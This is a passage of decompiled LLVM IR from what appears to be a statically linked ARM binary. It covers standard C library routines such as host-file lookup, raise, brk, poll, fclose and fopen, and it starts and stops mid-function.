  br i1 %v2_d730, label %dec_label_pc_d738, label %dec_label_pc_d6a8

dec_label_pc_d738:                                ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_124f0.255 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_d744 = call i32 @__GI_strcoll(i8* %v3_d744, i32 ptrtoint ([11 x i8]* @global_var_124f0.255 to i32))
  store i32 %v4_d744, i32* %r0.global-to-local, align 4
  %v2_d748 = icmp eq i32 %v4_d744, 0
  br i1 %v2_d748, label %dec_label_pc_d770.preheader, label %dec_label_pc_d794

dec_label_pc_d770.preheader:                      ; preds = %dec_label_pc_d738
  br label %dec_label_pc_d770

dec_label_pc_d758:                                ; preds = %dec_label_pc_d788
  %v1_d758 = add i32 %v5_d778, -36
  %v2_d758 = inttoptr i32 %v1_d758 to i32*
  %v3_d758 = load i32, i32* %v2_d758, align 4
  store i32 %v3_d758, i32* %r0.global-to-local, align 4
  %v1_d75c = inttoptr i32 %v3_d758 to i8*
  %v2_d75c = call i32 @__GI_strdup(i8* %v1_d75c)
  store i32 %v2_d75c, i32* %r0.global-to-local, align 4
  %v0_d764 = load i32, i32* @r4, align 4
  %v1_d764 = add i32 %v0_d764, 1
  store i32 %v1_d764, i32* %r2.global-to-local, align 4
  %v5_d768 = mul i32 %v0_d764, 4
  %v6_d768 = add i32 %v5_d768, ptrtoint (i32* @global_var_1dba8.97 to i32)
  %v7_d768 = inttoptr i32 %v6_d768 to i32*
  store i32 %v2_d75c, i32* %v7_d768, align 4
  %v0_d76c = load i32, i32* %r2.global-to-local, align 4
  %v1_d76c = load i32, i32* @r7, align 4
  %v2_d76c = inttoptr i32 %v1_d76c to i32*
  store i32 %v0_d76c, i32* %v2_d76c, align 4
  %v0_d774.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d770

dec_label_pc_d770:                                ; preds = %dec_label_pc_d770.preheader, %dec_label_pc_d758
  %v0_d780 = phi i32 [ 1, %dec_label_pc_d770.preheader ], [ %v0_d774.pre, %dec_label_pc_d758 ]
  store i32 %v2_d6a8, i32* %r2.global-to-local, align 4
  %v1_d774 = load i32, i32* @r8, align 4
  %v2_d774 = sub i32 %v0_d780, %v1_d774
  %v4_d774 = xor i32 %v1_d774, %v0_d780
  %v5_d774 = xor i32 %v2_d774, %v0_d780
  %v6_d774 = and i32 %v5_d774, %v4_d774
  %v7_d774 = icmp slt i32 %v6_d774, 0
  %v8_d774 = icmp slt i32 %v2_d774, 0
  %v4_d778 = mul i32 %v0_d780, 4
  %v5_d778 = add i32 %v4_d778, %v2_d6a8
  store i32 ptrtoint (i32* @global_var_1dbb4.94 to i32), i32* @r7, align 4
  %v1_d780 = add i32 %v0_d780, 1
  store i32 %v1_d780, i32* @r5, align 4
  %v2_d784 = xor i1 %v8_d774, %v7_d774
  br i1 %v2_d784, label %dec_label_pc_d788, label %dec_label_pc_d794

dec_label_pc_d788:                                ; preds = %dec_label_pc_d770
  %v2_d788 = load i32, i32* @global_var_1dbb4.94, align 4
  store i32 %v2_d788, i32* @r4, align 4
  %v7_d790 = icmp slt i32 %v2_d788, 3
  br i1 %v7_d790, label %dec_label_pc_d758, label %dec_label_pc_d794

dec_label_pc_d794:                                ; preds = %dec_label_pc_d770, %dec_label_pc_d788, %dec_label_pc_d738
  %v0_d794 = load i32, i32* @r6, align 4
  store i32 %v0_d794, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_124fc.258 to i32), i32* @r1, align 4
  %v3_d79c = inttoptr i32 %v0_d794 to i8*
  %v4_d79c = call i32 @__GI_strcoll(i8* %v3_d79c, i32 ptrtoint ([7 x i8]* @global_var_124fc.258 to i32))
  store i32 %v4_d79c, i32* %r0.global-to-local, align 4
  %v2_d7a0 = icmp eq i32 %v4_d79c, 0
  br i1 %v2_d7a0, label %dec_label_pc_d7d8.preheader, label %dec_label_pc_d7a8

dec_label_pc_d7a8:                                ; preds = %dec_label_pc_d794
  %v0_d7a8 = load i32, i32* @r6, align 4
  store i32 %v0_d7a8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_12504.260 to i32), i32* @r1, align 4
  %v3_d7b0 = inttoptr i32 %v0_d7a8 to i8*
  %v4_d7b0 = call i32 @__GI_strcoll(i8* %v3_d7b0, i32 ptrtoint ([7 x i8]* @global_var_12504.260 to i32))
  store i32 %v4_d7b0, i32* %r0.global-to-local, align 4
  %v2_d7b4 = icmp eq i32 %v4_d7b0, 0
  br i1 %v2_d7b4, label %dec_label_pc_d7d8.preheader, label %dec_label_pc_d834.backedge

dec_label_pc_d7d8.preheader:                      ; preds = %dec_label_pc_d794, %dec_label_pc_d7a8
  store i32 ptrtoint (i32* @global_var_1dbb8.234 to i32), i32* @r4, align 4
  %v2_d7dc60 = load i32, i32* @global_var_1dbb8.234, align 4
  store i32 ptrtoint (i32* @global_var_1db98.238 to i32), i32* @r5, align 4
  %v1_d7e863 = add i32 %v2_d7dc60, -1
  store i32 %v1_d7e863, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_d7dc60, 1
  br i1 %tmp5964, label %dec_label_pc_d7f0, label %dec_label_pc_d7c0

dec_label_pc_d7c0:                                ; preds = %dec_label_pc_d7d8.preheader, %dec_label_pc_d7c0
  %v1_d7e865 = phi i32 [ %v1_d7e8, %dec_label_pc_d7c0 ], [ %v1_d7e863, %dec_label_pc_d7d8.preheader ]
  %v4_d7c0 = mul i32 %v1_d7e865, 4
  %v5_d7c0 = add i32 %v4_d7c0, ptrtoint (i32* @global_var_1db98.238 to i32)
  %v6_d7c0 = inttoptr i32 %v5_d7c0 to i32*
  %v7_d7c0 = load i32, i32* %v6_d7c0, align 4
  store i32 %v7_d7c0, i32* %r0.global-to-local, align 4
  store i32 %v1_d7e865, i32* @global_var_1dbb8.234, align 4
  %v1_d7c8 = call i32 @free(i32 %v7_d7c0)
  store i32 %v1_d7c8, i32* %r0.global-to-local, align 4
  %v0_d7cc = load i32, i32* @r4, align 4
  %v1_d7cc = inttoptr i32 %v0_d7cc to i32*
  %v2_d7cc = load i32, i32* %v1_d7cc, align 4
  %v1_d7d4 = load i32, i32* @r5, align 4
  %v5_d7d4 = mul i32 %v2_d7cc, 4
  %v6_d7d4 = add i32 %v1_d7d4, %v5_d7d4
  %v7_d7d4 = inttoptr i32 %v6_d7d4 to i32*
  store i32 0, i32* %v7_d7d4, align 4
  store i32 ptrtoint (i32* @global_var_1dbb8.234 to i32), i32* @r4, align 4
  %v2_d7dc = load i32, i32* @global_var_1dbb8.234, align 4
  store i32 ptrtoint (i32* @global_var_1db98.238 to i32), i32* @r5, align 4
  %v1_d7e8 = add i32 %v2_d7dc, -1
  store i32 %v1_d7e8, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_d7dc, 1
  br i1 %tmp59, label %dec_label_pc_d7f0, label %dec_label_pc_d7c0

dec_label_pc_d7f0:                                ; preds = %dec_label_pc_d7c0, %dec_label_pc_d7d8.preheader
  br label %dec_label_pc_d810

dec_label_pc_d7f8:                                ; preds = %dec_label_pc_d828
  %v1_d7f8 = add i32 %v5_d818, -36
  %v2_d7f8 = inttoptr i32 %v1_d7f8 to i32*
  %v3_d7f8 = load i32, i32* %v2_d7f8, align 4
  store i32 %v3_d7f8, i32* %r0.global-to-local, align 4
  %v1_d7fc = inttoptr i32 %v3_d7f8 to i8*
  %v2_d7fc = call i32 @__GI_strdup(i8* %v1_d7fc)
  store i32 %v2_d7fc, i32* %r0.global-to-local, align 4
  %v0_d804 = load i32, i32* @r4, align 4
  %v1_d804 = add i32 %v0_d804, 1
  store i32 %v1_d804, i32* %r2.global-to-local, align 4
  %v5_d808 = mul i32 %v0_d804, 4
  %v6_d808 = add i32 %v5_d808, ptrtoint (i32* @global_var_1db98.238 to i32)
  %v7_d808 = inttoptr i32 %v6_d808 to i32*
  store i32 %v2_d7fc, i32* %v7_d808, align 4
  %v0_d80c = load i32, i32* %r2.global-to-local, align 4
  %v1_d80c = load i32, i32* @r6, align 4
  %v2_d80c = inttoptr i32 %v1_d80c to i32*
  store i32 %v0_d80c, i32* %v2_d80c, align 4
  %v0_d814.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d810

dec_label_pc_d810:                                ; preds = %dec_label_pc_d7f0, %dec_label_pc_d7f8
  %v0_d820 = phi i32 [ 1, %dec_label_pc_d7f0 ], [ %v0_d814.pre, %dec_label_pc_d7f8 ]
  store i32 %v2_d6a8, i32* %r2.global-to-local, align 4
  %v1_d814 = load i32, i32* @r8, align 4
  %v2_d814 = sub i32 %v0_d820, %v1_d814
  %v4_d814 = xor i32 %v1_d814, %v0_d820
  %v5_d814 = xor i32 %v2_d814, %v0_d820
  %v6_d814 = and i32 %v5_d814, %v4_d814
  %v7_d814 = icmp slt i32 %v6_d814, 0
  %v8_d814 = icmp slt i32 %v2_d814, 0
  %v4_d818 = mul i32 %v0_d820, 4
  %v5_d818 = add i32 %v4_d818, %v2_d6a8
  store i32 ptrtoint (i32* @global_var_1dbb8.234 to i32), i32* @r6, align 4
  %v1_d820 = add i32 %v0_d820, 1
  store i32 %v1_d820, i32* @r5, align 4
  %v2_d824 = xor i1 %v8_d814, %v7_d814
  br i1 %v2_d824, label %dec_label_pc_d828, label %dec_label_pc_d834.backedge

dec_label_pc_d828:                                ; preds = %dec_label_pc_d810
  %v2_d828 = load i32, i32* @global_var_1dbb8.234, align 4
  store i32 %v2_d828, i32* @r4, align 4
  %v7_d830 = icmp slt i32 %v2_d828, 4
  br i1 %v7_d830, label %dec_label_pc_d7f8, label %dec_label_pc_d834.backedge

dec_label_pc_d664.preheader:                      ; preds = %dec_label_pc_d664.preheader.lr.ph, %dec_label_pc_d834.backedge
  store i32 %v2_d5f8, i32* %r0.global-to-local, align 4
  %v2_d66412 = load i8, i8* %v1_d66411, align 4
  %v3_d66413 = zext i8 %v2_d66412 to i32
  store i32 %v3_d66413, i32* %r2.global-to-local, align 4
  %v2_d66814 = icmp eq i8 %v2_d66412, 0
  br i1 %v2_d66814, label %dec_label_pc_d684, label %dec_label_pc_d670.lr.ph

dec_label_pc_d670.lr.ph:                          ; preds = %dec_label_pc_d664.preheader
  %v2_d674.pre = load i32, i32* @global_var_1b514, align 4
  br label %dec_label_pc_d670

dec_label_pc_d854:                                ; preds = %dec_label_pc_d834.backedge, %dec_label_pc_d834.preheader
  %v0_d854 = load i32, i32* @sl, align 4
  store i32 %v0_d854, i32* %r0.global-to-local, align 4
  %v1_d858 = inttoptr i32 %v0_d854 to i8*
  %v2_d858 = call i32 @__GI_fclose(i8* %v1_d858)
  store i32 %v2_d858, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d86c

dec_label_pc_d860:                                ; preds = %dec_label_pc_d648
  %v0_d860 = call i32 @__GI___h_errno_location()
  store i32 %v0_d860, i32* %r0.global-to-local, align 4
  %v2_d868 = inttoptr i32 %v0_d860 to i32*
  store i32 3, i32* %v2_d868, align 4
  br label %dec_label_pc_d86c

dec_label_pc_d86c:                                ; preds = %entry, %dec_label_pc_d854, %dec_label_pc_d860
  store i32 %v2_d5fc, i32* @r0, align 4
  %v1_d87c = call i32 @__pthread_return_void()
  store i32 %v1_d87c, i32* %r0.global-to-local, align 4
  store i32 %v6_d5f4, i32* @r5, align 4
  store i32 %v9_d5f4, i32* @r6, align 4
  store i32 %v12_d5f4, i32* @r7, align 4
  store i32 %v15_d5f4, i32* @r8, align 4
  store i32 %v18_d5f4, i32* @sl, align 4
  ret i32 %v1_d87c

; uselistorder directives
  uselistorder i32 %v3_d66413, { 2, 1, 0 }
  uselistorder i32 %v2_d814, { 1, 0 }
  uselistorder i32 %v0_d820, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_d7e8, { 1, 0 }
  uselistorder i32 %v1_d7e865, { 1, 0 }
  uselistorder i32 %v2_d774, { 1, 0 }
  uselistorder i32 %v0_d780, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_d6b0, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_d6f020, { 1, 0, 2 }
  uselistorder i32 %v2_d6a8, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_d5f8, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 7, 5, 6, 8, 1, 11, 9, 10, 12, 4, 13, 3, 14, 16, 15, 0, 17 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 6, 5, 23, 8, 7, 10, 9, 12, 11, 14, 13, 16, 15, 24, 17, 18, 21, 19, 22, 26, 25, 20, 3, 2, 27, 29, 1, 28 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1db98.238 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_1dbb8.234, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_1dbb8.234 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1dba8.97 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_1dbb4.94, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_d86c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d664.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_d810, { 1, 0 }
  uselistorder label %dec_label_pc_d7c0, { 1, 0 }
  uselistorder label %dec_label_pc_d7d8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_d794, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d770, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_d71c, { 1, 0 }
  uselistorder label %dec_label_pc_d718, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d6fc, { 1, 0 }
  uselistorder label %dec_label_pc_d6e8, { 1, 0 }
  uselistorder label %dec_label_pc_d6c8, { 1, 0 }
  uselistorder label %dec_label_pc_d834.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_d684, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d834.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_d904 = call i32 @__read_etc_hosts_r()
  ret i32 %v0_d904
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v3_d910 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_d918 = call i32 @__libc_getpid()
  store i32 %v3_d910, i32* @r4, align 4
  %v0_d924 = call i32 @kill()
  ret i32 %v0_d924

; uselistorder directives
  uselistorder i32 ()* @kill, { 1, 2, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_d928 = add i32 %arg1, 28
  %v2_d928 = inttoptr i32 %v1_d928 to i32*
  %v3_d928 = load i32, i32* %v2_d928, align 4
  %v1_d930 = add i32 %arg1, 44
  %v2_d930 = inttoptr i32 %v1_d930 to i32*
  %v3_d930 = load i32, i32* %v2_d930, align 4
  store i32 %v3_d928, i32* @global_var_1dbbc.265, align 4
  store i32 %v3_d930, i32* @global_var_1dbc0.267, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_d954 = call i32 @brk(i32* %arg1)
  %v3_d958 = icmp ult i32 %v2_d954, %tmp
  store i32 %v2_d954, i32* @global_var_1baec.215, align 4
  br i1 %v3_d958, label %dec_label_pc_d96c, label %dec_label_pc_d97c

dec_label_pc_d96c:                                ; preds = %entry
  %v0_d96c = call i32 @__errno_location()
  %v2_d974 = inttoptr i32 %v0_d96c to i32*
  store i32 12, i32* %v2_d974, align 4
  br label %dec_label_pc_d97c

dec_label_pc_d97c:                                ; preds = %entry, %dec_label_pc_d96c
  %v0_d97c = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_d96c ]
  ret i32 %v0_d97c

; uselistorder directives
  uselistorder i32* @global_var_1baec.215, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_d97c, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d988 = load i32, i32* @r4, align 4
  store i32 %v3_d988, i32* %stack_var_-8, align 4
  %v5_d98c = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_d98c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_d98c, -4095
  br i1 %tmp, label %dec_label_pc_d9ac, label %dec_label_pc_d99c

dec_label_pc_d99c:                                ; preds = %entry
  %v0_d99c = call i32 @__errno_location()
  %v0_d9a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_d9a0 = sub i32 0, %v0_d9a0
  %v2_d9a4 = inttoptr i32 %v0_d99c to i32*
  store i32 %v1_d9a0, i32* %v2_d9a4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d9ac

dec_label_pc_d9ac:                                ; preds = %entry, %dec_label_pc_d99c
  %v0_d9ac = phi i32 [ %v5_d98c, %entry ], [ -1, %dec_label_pc_d99c ]
  %v2_d9b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d9b0, i32* @r4, align 4
  ret i32 %v0_d9ac

; uselistorder directives
  uselistorder i32 %v5_d98c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d9ac, { 1, 0 }
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v2_d9b8 = add i32 %tmp, 52
  %v3_d9b8 = inttoptr i32 %v2_d9b8 to i32*
  %v4_d9b8 = load i32, i32* %v3_d9b8, align 4
  store i32 %v4_d9b8, i32* @r8, align 4
  %v2_d9bc = add i32 %tmp, 56
  store i32 %v2_d9bc, i32* @r5, align 4
  %v2_d9c0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_d9c4 = icmp eq i32 %v4_d9b8, 0
  store i1 %v2_d9c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_d9d4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_d9d4, i32* @r0, align 4
  br i1 %v2_d9c4, label %dec_label_pc_d9dc, label %dec_label_pc_d9f8

dec_label_pc_d9dc:                                ; preds = %entry
  store i32 49340, i32* %r3.global-to-local, align 4
  %v1_d9e4 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_c0b4.90 to i32), i32* %r3.global-to-local, align 4
  %v1_d9f4 = call i32 @__pthread_return_0()
  %v0_d9f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d9f8

dec_label_pc_d9f8:                                ; preds = %entry, %dec_label_pc_d9dc
  %v0_da00 = phi i32 [ %tmp, %entry ], [ %v0_d9f8.pre, %dec_label_pc_d9dc ]
  %v1_d9f8 = inttoptr i32 %v0_da00 to i8*
  %v2_d9f8 = load i8, i8* %v1_d9f8, align 1
  %v3_d9f8 = zext i8 %v2_d9f8 to i32
  %v1_d9fc = and i32 %v3_d9f8, 64
  store i32 %v1_d9fc, i32* %r3.global-to-local, align 4
  %v2_d9fc = icmp eq i32 %v1_d9fc, 0
  store i1 %v2_d9fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d9fc, i32* @r7, align 4
  br i1 %v2_d9fc, label %dec_label_pc_da14, label %dec_label_pc_da0c

dec_label_pc_da0c:                                ; preds = %dec_label_pc_d9f8
  %v3_da0c = call i32 @fflush_unlocked(i8* %v1_d9f8)
  store i32 %v3_da0c, i32* @r7, align 4
  %v0_da14.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_da14

dec_label_pc_da14:                                ; preds = %dec_label_pc_d9f8, %dec_label_pc_da0c
  %v0_da14 = phi i32 [ %v0_da00, %dec_label_pc_d9f8 ], [ %v0_da14.pre, %dec_label_pc_da0c ]
  %v1_da14 = add i32 %v0_da14, 4
  %v2_da14 = inttoptr i32 %v1_da14 to i32*
  %v3_da14 = load i32, i32* %v2_da14, align 4
  %v1_da18 = call i32 @__libc_close(i32 %v3_da14)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_da20 = icmp slt i32 %v1_da18, 0
  %v2_da20 = icmp eq i32 %v1_da18, 0
  store i1 %v2_da20, i1* %cpsr_z.global-to-local, align 1
  %v1_da24 = load i32, i32* @r4, align 4
  %v2_da24 = add i32 %v1_da24, 4
  %v3_da24 = inttoptr i32 %v2_da24 to i32*
  store i32 -1, i32* %v3_da24, align 4
  store i32 %v2_d9c0, i32* @r0, align 4
  br i1 %v1_da20, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_da14
  %v3_da38 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_da38, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_da14, %bb
  %v1_da44 = call i32 @__pthread_return_void()
  %v1_da50 = call i32 @__pthread_return_0()
  %v2_da58 = load i32, i32* @global_var_1baf0.275, align 4
  %v1_da5c = add i32 %v2_da58, 1
  store i32 %v1_da5c, i32* %r3.global-to-local, align 4
  store i32 %v1_da5c, i32* @global_var_1baf0.275, align 4
  store i32 %v2_d9c0, i32* @r0, align 4
  %v1_da74 = call i32 @__pthread_return_void()
  %v0_da78 = load i32, i32* @r4, align 4
  %v1_da78 = inttoptr i32 %v0_da78 to i32*
  %v2_da78 = load i32, i32* %v1_da78, align 4
  %v1_da7c = and i32 %v2_da78, 24576
  store i32 %v1_da7c, i32* %r3.global-to-local, align 4
  %v3_da801 = udiv i32 %v1_da7c, 256
  %v1_da84 = trunc i32 %v3_da801 to i8
  %v3_da84 = add i32 %v0_da78, 1
  %v4_da84 = inttoptr i32 %v3_da84 to i8*
  store i8 %v1_da84, i8* %v4_da84, align 1
  %v0_da88 = load i32, i32* %r3.global-to-local, align 4
  %v1_da88 = trunc i32 %v0_da88 to i8
  %v2_da88 = load i32, i32* @r4, align 4
  %v3_da88 = inttoptr i32 %v2_da88 to i8*
  store i8 %v1_da88, i8* %v3_da88, align 1
  %v0_da8c = load i32, i32* @r4, align 4
  %v1_da8c = inttoptr i32 %v0_da8c to i32*
  %v2_da8c = load i32, i32* %v1_da8c, align 4
  %v1_da90 = or i32 %v2_da8c, 48
  store i32 %v1_da90, i32* %r3.global-to-local, align 4
  %v3_da94 = sdiv i32 %v2_da8c, 256
  %v0_da98 = load i32, i32* @r8, align 4
  %v2_da98 = icmp eq i32 %v0_da98, 0
  store i1 %v2_da98, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_d9d4, i32* @r0, align 4
  %v1_daa8 = trunc i32 %v3_da94 to i8
  %v3_daa8 = add i32 %v0_da8c, 1
  %v4_daa8 = inttoptr i32 %v3_daa8 to i8*
  store i8 %v1_daa8, i8* %v4_daa8, align 1
  %v0_daac = load i32, i32* %r3.global-to-local, align 4
  %v1_daac = trunc i32 %v0_daac to i8
  %v2_daac = load i32, i32* @r4, align 4
  %v3_daac = inttoptr i32 %v2_daac to i8*
  store i8 %v1_daac, i8* %v3_daac, align 1
  %v0_dab0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dab0, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_dab4 = call i32 @__pthread_return_void()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_dab8 = load i32, i32* @r4, align 4
  %v1_dab8 = add i32 %v0_dab8, 1
  %v2_dab8 = inttoptr i32 %v1_dab8 to i8*
  %v3_dab8 = load i8, i8* %v2_dab8, align 1
  %v4_dab8 = zext i8 %v3_dab8 to i32
  store i32 %v4_dab8, i32* %r3.global-to-local, align 4
  %v1_dabc = and i32 %v4_dab8, 64
  %v2_dabc = icmp eq i32 %v1_dabc, 0
  store i1 %v2_dabc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dabc, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_dac4 = xor i1 %v2_dabc, true
  call void @__pseudo_cond_branch(i1 %v1_dac4, i32 ptrtoint (i32* @global_var_b514.240 to i32))
  store i32 %v2_d9c0, i32* @r0, align 4
  %v1_dad8 = call i32 @__pthread_return_void()
  %v1_dae4 = call i32 @__pthread_return_0()
  %v2_daec = load i32, i32* @global_var_1baf4.279, align 4
  %v1_daf0 = add i32 %v2_daec, 1
  store i32 %v1_daf0, i32* %r3.global-to-local, align 4
  store i32 %v2_d9c0, i32* @r0, align 4
  store i32 %v1_daf0, i32* @global_var_1baf4.279, align 4
  %v1_db04 = call i32 @__pthread_return_void()
  %v1_db08 = call i32 @_stdio_openlist_dec_use(i32 %v1_db04)
  %v0_db0c = load i32, i32* @r7, align 4
  ret i32 %v0_db0c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__libc_close, { 3, 2, 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_da14, { 1, 0 }
  uselistorder label %dec_label_pc_d9f8, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_db3c = call i32 @_stdio_fopen()
  ret i32 %v0_db3c
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_db40 = load i32, i32* @r4, align 4
  store i32 %v3_db40, i32* %stack_var_-24, align 4
  %v6_db40 = load i32, i32* @r5, align 4
  %v9_db40 = load i32, i32* @r6, align 4
  %v15_db40 = load i32, i32* @r8, align 4
  %v0_db44 = load i32, i32* @r1, align 4
  %v1_db44 = inttoptr i32 %v0_db44 to i8*
  %v2_db44 = load i8, i8* %v1_db44, align 1
  %v3_db44 = zext i8 %v2_db44 to i32
  store i32 %v3_db44, i32* @ip, align 4
  %v7_db48 = icmp eq i8 %v2_db44, 114
  store i1 %v7_db48, i1* %cpsr_z.global-to-local, align 1
  %v2_db4c = ptrtoint i32* %stack_var_-56 to i32
  %v0_db50 = load i32, i32* @r0, align 4
  store i32 %v0_db50, i32* @r6, align 4
  %v0_db54 = load i32, i32* @r2, align 4
  store i32 %v0_db54, i32* @r8, align 4
  %v0_db58 = load i32, i32* @r3, align 4
  store i32 %v0_db58, i32* @r5, align 4
  br i1 %v7_db48, label %dec_label_pc_dba4, label %dec_label_pc_db60

dec_label_pc_db60:                                ; preds = %entry
  %v7_db60 = icmp eq i8 %v2_db44, 119
  store i1 %v7_db60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_db60, label %bb, label %dec_label_pc_db6c

bb:                                               ; preds = %dec_label_pc_db60
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_dba8

dec_label_pc_db6c:                                ; preds = %dec_label_pc_db60
  %v7_db6c = icmp eq i8 %v2_db44, 97
  store i1 %v7_db6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_db6c, label %bb30, label %dec_label_pc_db78

bb30:                                             ; preds = %dec_label_pc_db6c
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_dba8

dec_label_pc_db78:                                ; preds = %dec_label_pc_db6c, %dec_label_pc_dc30, %dec_label_pc_dc04
  %v0_db78 = call i32 @__errno_location()
  store i32 %v0_db78, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_db80 = load i32, i32* @r8, align 4
  %v2_db80 = icmp eq i32 %v0_db80, 0
  store i1 %v2_db80, i1* %cpsr_z.global-to-local, align 1
  %v2_db84 = inttoptr i32 %v0_db78 to i32*
  store i32 22, i32* %v2_db84, align 4
  br i1 %v2_db80, label %dec_label_pc_ddf8, label %dec_label_pc_db8c

dec_label_pc_db8c:                                ; preds = %dec_label_pc_dc54._crit_edge, %dec_label_pc_db78
  %v0_db8c = load i32, i32* @r8, align 4
  %v1_db8c = add i32 %v0_db8c, 1
  %v2_db8c = inttoptr i32 %v1_db8c to i8*
  %v3_db8c = load i8, i8* %v2_db8c, align 1
  %v4_db8c = zext i8 %v3_db8c to i32
  store i32 %v4_db8c, i32* %r3.global-to-local, align 4
  %v1_db90 = and i32 %v4_db8c, 32
  %v2_db90 = icmp eq i32 %v1_db90, 0
